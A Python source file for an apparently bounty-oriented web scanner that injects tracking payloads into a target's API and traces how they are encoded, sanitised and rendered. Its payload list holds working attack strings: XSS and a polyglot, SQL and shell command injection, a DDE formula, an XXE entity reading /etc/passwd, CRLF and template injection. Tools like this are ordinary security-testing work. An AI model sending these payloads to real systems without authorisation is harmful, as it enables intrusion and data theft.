"""
Input Transformation Tracker - Finding Validation Bypass Paths

Tracks input data through all transformation layers to find where
sanitization/validation breaks down.

The unfair advantage: Humans test input at ONE point. We track data through
EVERY transformation layer (sanitization, encoding, storage, retrieval, rendering)
to find bypass paths.

Finds:
- Multi-layer sanitization bypasses (escaped at input, unescaped in rendering)
- Double/triple encoding attacks (WAF bypass via multiple encoding layers)
- Context-switch vulnerabilities (safe in HTML, dangerous in JavaScript)
- Transformation chain bypasses (passes all validators, executed in final context)
- Storage-retrieval inconsistencies (sanitized on write, unsanitized on read)

Expected impact: 8-15 findings/month @ $8K-$18K = $64K-$270K/month
"""

import asyncio
import aiohttp
import re
import hashlib
import time
from typing import Dict, List, Set, Tuple, Optional, Any
from dataclasses import dataclass, field
from collections import defaultdict
from enum import Enum
from datetime import datetime
import urllib.parse


class TransformationType(Enum):
    """Types of transformations data can undergo"""
    HTML_ENCODE = "html_encode"
    HTML_DECODE = "html_decode"
    URL_ENCODE = "url_encode"
    URL_DECODE = "url_decode"
    JSON_ENCODE = "json_encode"
    JSON_DECODE = "json_decode"
    BASE64_ENCODE = "base64_encode"
    BASE64_DECODE = "base64_decode"
    SQL_ESCAPE = "sql_escape"
    REGEX_ESCAPE = "regex_escape"
    HTML_SANITIZE = "html_sanitize"
    XSS_FILTER = "xss_filter"
    MARKDOWN_RENDER = "markdown_render"
    TEMPLATE_RENDER = "template_render"
    CSV_EXPORT = "csv_export"
    PDF_RENDER = "pdf_render"
    EMAIL_RENDER = "email_render"


class RenderContext(Enum):
    """Different rendering contexts"""
    HTML = "html"
    JAVASCRIPT = "javascript"
    JSON = "json"
    XML = "xml"
    SQL = "sql"
    SHELL = "shell"
    EMAIL = "email"
    PDF = "pdf"
    CSV = "csv"
    MARKDOWN = "markdown"
    TEMPLATE = "template"
    LOG = "log"


@dataclass
class PayloadTransformation:
    """Represents one transformation of the payload"""
    transformation_type: TransformationType
    input_value: str
    output_value: str
    context: RenderContext
    location: str  # Where this transformation happened
    timestamp: float


@dataclass
class PayloadTrace:
    """Complete trace of a payload through the system"""
    trace_id: str
    original_payload: str
    injection_point: str
    transformations: List[PayloadTransformation]
    final_contexts: Dict[RenderContext, str]  # Where payload ended up
    dangerous_contexts: List[RenderContext]  # Contexts where payload is dangerous


@dataclass
class TransformationVulnerability:
    """A vulnerability found via transformation tracking"""
    vuln_id: str
    title: str
    severity: str
    cvss_score: float
    description: str
    trace: PayloadTrace
    bypass_type: str  # multi_layer, double_encode, context_switch, etc.
    exploitation_steps: List[str]
    impact: str
    confidence: float


class TransformationTracker:
    """
    Tracks input transformations to find validation bypass paths
    """

    def __init__(self):
        self.traces: List[PayloadTrace] = []
        self.vulnerabilities: List[TransformationVulnerability] = []

        # Test payloads designed to survive different transformations
        self.test_payloads = self._generate_test_payloads()

    def _generate_test_payloads(self) -> List[Dict[str, str]]:
        """
        Generates test payloads designed to track through transformations
        """

        trace_id = lambda: hashlib.sha256(str(time.time()).encode()).hexdigest()[:8]

        payloads = [
            # XSS payloads with tracking
            {
                "id": f"xss_{trace_id()}",
                "payload": f'<script>/*TRACK-{trace_id()}*/alert(1)</script>',
                "type": "xss",
                "dangerous_in": [RenderContext.HTML, RenderContext.JAVASCRIPT]
            },

            # Double-encoded XSS
            {
                "id": f"double_encode_{trace_id()}",
                "payload": urllib.parse.quote(urllib.parse.quote(f'<script>alert(1)</script>')),
                "type": "double_encode_xss",
                "dangerous_in": [RenderContext.HTML]
            },

            # Template injection
            {
                "id": f"ssti_{trace_id()}",
                "payload": f'{{{{7*7}}}}/*TRACK-{trace_id()}*/',
                "type": "template_injection",
                "dangerous_in": [RenderContext.TEMPLATE]
            },

            # SQL injection
            {
                "id": f"sql_{trace_id()}",
                "payload": f"' OR '1'='1' --TRACK-{trace_id()}",
                "type": "sql_injection",
                "dangerous_in": [RenderContext.SQL]
            },

            # Command injection
            {
                "id": f"cmd_{trace_id()}",
                "payload": f"; ls #TRACK-{trace_id()}",
                "type": "command_injection",
                "dangerous_in": [RenderContext.SHELL]
            },

            # CSV injection (DDE/Formula)
            {
                "id": f"csv_{trace_id()}",
                "payload": f'=cmd|"/c calc"!A1 REM TRACK-{trace_id()}',
                "type": "csv_injection",
                "dangerous_in": [RenderContext.CSV]
            },

            # XXE (XML External Entity)
            {
                "id": f"xxe_{trace_id()}",
                "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data><!--TRACK-{trace_id()}-->',
                "type": "xxe",
                "dangerous_in": [RenderContext.XML]
            },

            # CRLF injection
            {
                "id": f"crlf_{trace_id()}",
                "payload": f'test\\r\\n\\r\\n<script>alert(1)</script><!--TRACK-{trace_id()}-->',
                "type": "crlf_injection",
                "dangerous_in": [RenderContext.HTML, RenderContext.EMAIL]
            },

            # Polyglot payload (dangerous in multiple contexts)
            {
                "id": f"polyglot_{trace_id()}",
                "payload": f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                "type": "polyglot",
                "dangerous_in": [RenderContext.HTML, RenderContext.JAVASCRIPT]
            }
        ]

        return payloads

    async def track_payload(
        self,
        target_url: str,
        injection_endpoint: str,
        payload_spec: Dict[str, str],
        retrieval_endpoints: List[str]
    ) -> PayloadTrace:
        """
        Injects a payload and tracks it through the system

        Args:
            target_url: Base URL
            injection_endpoint: Where to inject payload
            payload_spec: Payload specification
            retrieval_endpoints: Where to look for payload
        """

        trace_id = payload_spec['id']
        payload = payload_spec['payload']

        print(f"[*] Tracking payload {trace_id} through system...")

        trace = PayloadTrace(
            trace_id=trace_id,
            original_payload=payload,
            injection_point=injection_endpoint,
            transformations=[],
            final_contexts={},
            dangerous_contexts=payload_spec['dangerous_in']
        )

        # Inject payload
        await self._inject_payload(target_url, injection_endpoint, payload)

        # Wait for processing
        await asyncio.sleep(1)

        # Search for payload in all contexts
        for endpoint in retrieval_endpoints:
            contexts = await self._retrieve_and_analyze(
                target_url,
                endpoint,
                trace_id
            )

            for context, value in contexts.items():
                trace.final_contexts[context] = value

                # Analyze transformations
                transformations = self._analyze_transformations(
                    original=payload,
                    rendered=value
                )

                trace.transformations.extend(transformations)

        self.traces.append(trace)

        return trace

    async def _inject_payload(
        self,
        base_url: str,
        endpoint: str,
        payload: str
    ):
        """
        Injects payload into endpoint
        """

        url = f"{base_url}{endpoint}"

        try:
            async with aiohttp.ClientSession() as session:
                # Try different injection methods
                # POST JSON
                await session.post(url, json={"data": payload, "name": payload, "comment": payload})

                # POST form
                await session.post(url, data={"data": payload, "name": payload})

                # Query parameter
                await session.get(f"{url}?data={urllib.parse.quote(payload)}")

        except:
            pass

    async def _retrieve_and_analyze(
        self,
        base_url: str,
        endpoint: str,
        trace_id: str
    ) -> Dict[RenderContext, str]:
        """
        Retrieves payload from endpoint and identifies rendering contexts
        """

        url = f"{base_url}{endpoint}"
        contexts = {}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    body = await response.text()
                    content_type = response.headers.get('Content-Type', '')

                    # Search for trace ID
                    if trace_id in body:
                        # Determine context
                        context = self._identify_context(content_type, body)
                        contexts[context] = body

        except:
            pass

        return contexts

    def _identify_context(self, content_type: str, body: str) -> RenderContext:
        """
        Identifies the rendering context
        """

        if 'html' in content_type.lower():
            return RenderContext.HTML
        elif 'json' in content_type.lower():
            return RenderContext.JSON
        elif 'xml' in content_type.lower():
            return RenderContext.XML
        elif 'csv' in content_type.lower():
            return RenderContext.CSV
        elif 'pdf' in content_type.lower():
            return RenderContext.PDF
        elif '<html' in body.lower():
            return RenderContext.HTML
        elif body.strip().startswith('{') or body.strip().startswith('['):
            return RenderContext.JSON
        else:
            return RenderContext.HTML  # Default

    def _analyze_transformations(
        self,
        original: str,
        rendered: str
    ) -> List[PayloadTransformation]:
        """
        Analyzes what transformations occurred
        """

        transformations = []

        # Check for HTML encoding
        if '&lt;' in rendered and '<' in original:
            transformations.append(PayloadTransformation(
                transformation_type=TransformationType.HTML_ENCODE,
                input_value=original,
                output_value=rendered,
                context=RenderContext.HTML,
                location="html_encoder",
                timestamp=time.time()
            ))

        # Check for URL encoding
        if '%3C' in rendered and '<' in original:
            transformations.append(PayloadTransformation(
                transformation_type=TransformationType.URL_ENCODE,
                input_value=original,
                output_value=rendered,
                context=RenderContext.HTML,
                location="url_encoder",
                timestamp=time.time()
            ))

        # Check for JSON escaping
        if '\\"' in rendered and '"' in original:
            transformations.append(PayloadTransformation(
                transformation_type=TransformationType.JSON_ENCODE,
                input_value=original,
                output_value=rendered,
                context=RenderContext.JSON,
                location="json_encoder",
                timestamp=time.time()
            ))

        # Check for sanitization
        if '<script>' in original and '<script>' not in rendered:
            transformations.append(PayloadTransformation(
                transformation_type=TransformationType.HTML_SANITIZE,
                input_value=original,
                output_value=rendered,
                context=RenderContext.HTML,
                location="html_sanitizer",
                timestamp=time.time()
            ))

        return transformations

    async def analyze_vulnerabilities(self) -> List[TransformationVulnerability]:
        """
        Analyzes traces to find transformation vulnerabilities
        """

        print(f"[*] Analyzing {len(self.traces)} payload traces...")

        for trace in self.traces:
            # Check if payload survived dangerous in any dangerous context
            vulns = []

            # Check for multi-layer bypass
            vulns.extend(self._detect_multi_layer_bypass(trace))

            # Check for context-switch vulnerability
            vulns.extend(self._detect_context_switch(trace))

            # Check for double-encoding bypass
            vulns.extend(self._detect_double_encoding(trace))

            # Check for transformation chain bypass
            vulns.extend(self._detect_transformation_chain_bypass(trace))

            self.vulnerabilities.extend(vulns)

        print(f"[+] Found {len(self.vulnerabilities)} transformation vulnerabilities")

        return self.vulnerabilities

    def _detect_multi_layer_bypass(self, trace: PayloadTrace) -> List[TransformationVulnerability]:
        """
        Detects bypasses that work by going through multiple layers
        """

        vulns = []

        # Check if payload was sanitized at input but appears unsanitized later
        has_sanitization = any(
            t.transformation_type in [
                TransformationType.HTML_SANITIZE,
                TransformationType.XSS_FILTER
            ]
            for t in trace.transformations
        )

        # Check if payload appears dangerous in final context
        for context, rendered in trace.final_contexts.items():
            if context in trace.dangerous_contexts:
                # Check if dangerous patterns still present
                dangerous_patterns = ['<script>', 'javascript:', 'onerror=', 'onload=']

                if any(pattern in rendered.lower() for pattern in dangerous_patterns):
                    vulns.append(TransformationVulnerability(
                        vuln_id=f"multi_layer_{trace.trace_id}",
                        title=f"Multi-Layer Sanitization Bypass in {context.value}",
                        severity="high",
                        cvss_score=7.5,
                        description=(
                            f"Payload was sanitized at input layer but appears "
                            f"unsanitized in {context.value} context. Multiple transformation "
                            f"layers created a bypass path."
                        ),
                        trace=trace,
                        bypass_type="multi_layer",
                        exploitation_steps=[
                            f"1. Inject payload at {trace.injection_point}",
                            "2. Payload passes initial sanitization",
                            f"3. Payload rendered in {context.value} without sanitization",
                            "4. Execute arbitrary JavaScript/code"
                        ],
                        impact="XSS, code injection, or data exfiltration",
                        confidence=0.85
                    ))

        return vulns

    def _detect_context_switch(self, trace: PayloadTrace) -> List[TransformationVulnerability]:
        """
        Detects vulnerabilities from context switching
        """

        vulns = []

        # If payload appears in multiple contexts
        if len(trace.final_contexts) > 1:
            # Check if safe in one context but dangerous in another
            contexts = list(trace.final_contexts.keys())

            for i, ctx1 in enumerate(contexts):
                for ctx2 in contexts[i+1:]:
                    # If payload is dangerous in ctx2 but was validated for ctx1
                    if ctx2 in trace.dangerous_contexts:
                        vulns.append(TransformationVulnerability(
                            vuln_id=f"context_switch_{trace.trace_id}_{ctx1}_{ctx2}",
                            title=f"Context Switch Vulnerability: {ctx1.value} → {ctx2.value}",
                            severity="high",
                            cvss_score=7.8,
                            description=(
                                f"Payload validated for {ctx1.value} context but also "
                                f"appears in {ctx2.value} context without re-validation. "
                                f"Safe in one context, dangerous in another."
                            ),
                            trace=trace,
                            bypass_type="context_switch",
                            exploitation_steps=[
                                f"1. Inject payload validated for {ctx1.value}",
                                f"2. Payload stored and later rendered in {ctx2.value}",
                                f"3. No validation for {ctx2.value} context",
                                "4. Exploit context-specific vulnerability"
                            ],
                            impact="Cross-context injection",
                            confidence=0.75
                        ))

        return vulns

    def _detect_double_encoding(self, trace: PayloadTrace) -> List[TransformationVulnerability]:
        """
        Detects double-encoding bypasses
        """

        vulns = []

        # Check if multiple encoding transformations occurred
        encoding_count = sum(
            1 for t in trace.transformations
            if 'ENCODE' in t.transformation_type.value
        )

        if encoding_count >= 2:
            vulns.append(TransformationVulnerability(
                vuln_id=f"double_encode_{trace.trace_id}",
                title="Double-Encoding Bypass Possible",
                severity="medium",
                cvss_score=6.0,
                description=(
                    f"Payload went through {encoding_count} encoding layers. "
                    "Double-encoding may bypass WAF/filters."
                ),
                trace=trace,
                bypass_type="double_encoding",
                exploitation_steps=[
                    "1. Double-encode malicious payload",
                    "2. First layer decodes (WAF/filter sees safe value)",
                    "3. Second layer decodes (executes malicious payload)",
                    "4. Bypass security controls"
                ],
                impact="WAF bypass, filter evasion",
                confidence=0.65
            ))

        return vulns

    def _detect_transformation_chain_bypass(self, trace: PayloadTrace) -> List[TransformationVulnerability]:
        """
        Detects bypasses via transformation chains
        """

        vulns = []

        # If payload went through many transformations (>3) and still dangerous
        if len(trace.transformations) > 3:
            for context in trace.dangerous_contexts:
                if context in trace.final_contexts:
                    vulns.append(TransformationVulnerability(
                        vuln_id=f"chain_bypass_{trace.trace_id}",
                        title=f"Transformation Chain Bypass ({len(trace.transformations)} layers)",
                        severity="high",
                        cvss_score=7.2,
                        description=(
                            f"Payload survived {len(trace.transformations)} transformation "
                            f"layers and remains dangerous in {context.value} context. "
                            "Each validator assumed previous layer handled it."
                        ),
                        trace=trace,
                        bypass_type="transformation_chain",
                        exploitation_steps=[
                            f"1. Craft payload that passes layer 1 validation",
                            f"2. Payload transforms through {len(trace.transformations)} layers",
                            "3. Each layer assumes previous layer validated",
                            f"4. Final rendering in {context.value} without validation",
                            "5. Payload executes"
                        ],
                        impact="Bypass layered security controls",
                        confidence=0.8
                    ))

        return vulns

    def generate_report(self) -> str:
        """Generates markdown report of transformation analysis"""

        report = ["# Input Transformation Analysis Report", ""]
        report.append(f"**Analysis Date:** {datetime.now().isoformat()}")
        report.append(f"**Payloads Tracked:** {len(self.traces)}")
        report.append(f"**Vulnerabilities Found:** {len(self.vulnerabilities)}")
        report.append("")

        # Group by bypass type
        by_type = defaultdict(list)
        for vuln in self.vulnerabilities:
            by_type[vuln.bypass_type].append(vuln)

        report.append("## Bypass Types")
        for bypass_type, vulns in by_type.items():
            report.append(f"- {bypass_type}: {len(vulns)}")
        report.append("")

        # Group by severity
        by_severity = defaultdict(list)
        for vuln in self.vulnerabilities:
            by_severity[vuln.severity].append(vuln)

        for severity in ['critical', 'high', 'medium', 'low']:
            if severity in by_severity:
                report.append(f"## {severity.upper()} Severity ({len(by_severity[severity])})")
                report.append("")

                for vuln in by_severity[severity]:
                    report.append(f"### {vuln.title}")
                    report.append(f"**Type:** {vuln.bypass_type} | **CVSS:** {vuln.cvss_score} | **Confidence:** {vuln.confidence*100:.0f}%")
                    report.append("")
                    report.append(f"**Description:**")
                    report.append(vuln.description)
                    report.append("")
                    report.append(f"**Transformation Path:**")
                    report.append(f"- Injection point: {vuln.trace.injection_point}")
                    report.append(f"- Transformations: {len(vuln.trace.transformations)}")
                    for t in vuln.trace.transformations[:5]:  # Show first 5
                        report.append(f"  - {t.transformation_type.value}")
                    report.append(f"- Final contexts: {list(vuln.trace.final_contexts.keys())}")
                    report.append("")
                    report.append(f"**Impact:** {vuln.impact}")
                    report.append("")
                    report.append(f"**Exploitation Steps:**")
                    for step in vuln.exploitation_steps:
                        report.append(f"{step}")
                    report.append("")
                    report.append("---")
                    report.append("")

        return "\n".join(report)


# Example usage
async def track_transformations(target_url: str):
    """
    Main entry point for transformation tracking
    """

    tracker = TransformationTracker()

    # Track each test payload
    for payload_spec in tracker.test_payloads:
        trace = await tracker.track_payload(
            target_url=target_url,
            injection_endpoint="/api/comments",
            payload_spec=payload_spec,
            retrieval_endpoints=[
                "/api/comments",
                "/api/export/csv",
                "/api/email/preview",
                "/admin/logs"
            ]
        )

    # Analyze for vulnerabilities
    vulns = await tracker.analyze_vulnerabilities()

    # Generate report
    report = tracker.generate_report()

    return vulns, report


if __name__ == "__main__":
    vulns, report = asyncio.run(track_transformations("https://example.com"))

    print("\n" + "="*60)
    print(report)
    print("="*60)

    print(f"\nFound {len(vulns)} transformation bypass vulnerabilities!")
